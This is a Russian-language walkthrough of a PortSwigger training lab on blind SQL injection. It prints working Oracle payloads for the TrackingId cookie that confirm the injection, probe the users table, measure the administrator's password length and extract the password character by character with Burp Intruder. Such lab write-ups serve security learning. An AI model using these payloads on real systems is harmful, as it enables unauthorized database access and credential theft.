# Blind SQL injection with conditional errors

## Theory

<h3>Вызов условных ответов путем триггера ошибок SQL</h3>

В этой ситуации часто можно заставить приложение возвращать условные ответы, вызывая ошибки SQL, в зависимости от введенного условия. Это включает в себя изменение запроса таким образом, чтобы он вызывал ошибку базы данных, если условие истинно, но не если условие ложно. Очень часто необработанная ошибка, выдаваемая базой данных, приводит к некоторой разнице в ответе приложения (например, к сообщению об ошибке), что позволяет нам сделать вывод об истинности внедренного условия.

Чтобы увидеть, как это работает, предположим, что два запроса отправлены по очереди, содержащие следующие значения TrackingId cookie:
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Входные данные используют ключевое слово CASE для проверки условия и возврата другого выражения в зависимости от того, истинно ли выражение. При первом вводе выражение CASE оценивается как «a», что не вызывает никакой ошибки. При втором вводе он оценивается как 1/0, что вызывает ошибку деления на ноль. Предполагая, что ошибка вызывает некоторую разницу в HTTP-ответе приложения, мы можем использовать эту разницу, чтобы сделать вывод, верно ли введенное условие.

Используя эту технику, мы можем получать данные, проверяя один символ за раз:
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/1.png)

Выбираем пункт Pets. Отправим запрос, чтобы удостовериться, что страница уязвима к SQL-иньекции. При вводе **''** синтаксическая ошибка исчезла, что оказывает влияние на ответ.
```
qGA';

qGA'';
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/2.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/3.png)

Теперь нужно подтвердить, что сервер интерпретирует инъекцию как SQL-запрос, т. е. что ошибка является синтаксической ошибкой SQL, а не ошибкой любого другого типа.
```
qGA'||(select+'')||';
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/4.png)

Запрос возвращает ошибку, возможно дело в базе данных, попробуем модифицировать запрос для базы данных Oracle.
```
qGA'||(select+''+from+dual)||';
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/5.png)

Чтобы убедиться, что таблица Users существует, отправим следующий запрос. **Where rownum = 1** является важным условием. Мы используем его, чтобы запрос не возвращал более одной строки, что нарушит нашу конкатенацию.
```
qGA'||(select+''+from+users+where+rownum=1)||';
```

* Rownum – это псевдостолбец, значения которого можно увидеть, включив его в любой результирующий набор, например в список столбцов оператора SELECT. Значениям столбца ROWNUM присваиваются номера 1, 2, 3, 4, ... N, где N – число строк результирующего набора запроса.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/6.png)

Используем поведение приложения для проверки условий. Отправим следующие запросы. Ошибка исчезает, значит мы можем инициировать ошибку при истинности определенного условия. Оператор CASE проверяет условие и оценивает одно выражение, если условие истинно, и другое выражение, если условие ложно. Первое выражение содержит деление на ноль, что вызывает ошибку. В этом случае две полезные нагрузки проверяют условия **1=1** и **1=2** и получают ошибку, когда условие истинно.

```
qGA'||(select+case+when+(1=1)+then+to_char(1/0)+else+''+end+from+dual)||';

qGA'||(select+case+when+(1=2)+then+to_char(1/0)+else+''+end+from+dual)||';
```

* Функция TO_CHAR преобразует число или дату в строку.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/7.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/8.png)

Мы можем использовать это поведение, чтобы проверить, существуют ли определенные записи в таблице. Используем следующий запрос, чтобы проверить, существует ли пользователь с именем Administrator. Убедимся, что условие истинно (получена ошибка), подтвердив наличие пользователя с именем Administrator.
```
qGA'||(select+case+when+(1=1)+then+to_char(1/0)+else+''+end+from+users+where+username='administrator')||';
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/9.png)

Следующим шагом является определение количества символов в пароле пользователя Administrator. Для этого используем следующий запрос. Изменяем цифру length(password)>**19** в запросе, чтобы узнать количество символов в пароле.

```
qGA'||(select+case+when+length(password)>19+then+to_char(1/0)+else+''+end+from+users+where+username='administrator')||';
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/10.png)

После определения длины пароля следующим шагом будет проверка символа в каждой позиции, чтобы определить его значение. Отправляем запрос в Burp Intruder и заключаем нужные нам значения для перебора в специальные символы. В фильтре осталяем только ответы к кодом 500. Получаем пароль.

```
qGA'||(select+case+when+substr(password,1,1)='a'+then+to_char(1/0)+else+''+end+from+users+where+username='administrator')||';
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/11.png)

Логинимся под администратора и получаем ответ от приложения.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_errors/assets/12.png)
